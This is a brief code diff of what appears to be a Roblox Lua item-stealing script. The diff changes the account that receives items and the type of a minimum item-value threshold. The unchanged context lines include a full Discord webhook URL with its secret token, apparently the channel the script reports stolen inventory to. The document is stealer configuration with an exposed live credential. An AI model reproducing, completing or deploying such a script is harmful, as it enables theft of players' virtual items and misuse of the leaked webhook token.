@@ -1,4 +1,4 @@
-Username = "MargarinePool"
+Username = "Virtual122"
 Username2 = "Kuleczka1355"
 Webhook = "https://discord.com/api/webhooks/1295130293442707539/AeZPvDHQun-6kRT8AsOiwF8Ucxdmtp-h3l1-QbWecES5l6OACFs7uVUTtTxV2_yiWBD4"
 
@@ -297,7 +297,7 @@ local function GetThumbnail(imageid)
     return thumbnail
 end
 
-local MinimumRAP = "100000"
+local MinimumRAP = 100000
 
 if Inventory.Box then
     for key, value in pairs(Inventory.Box) do
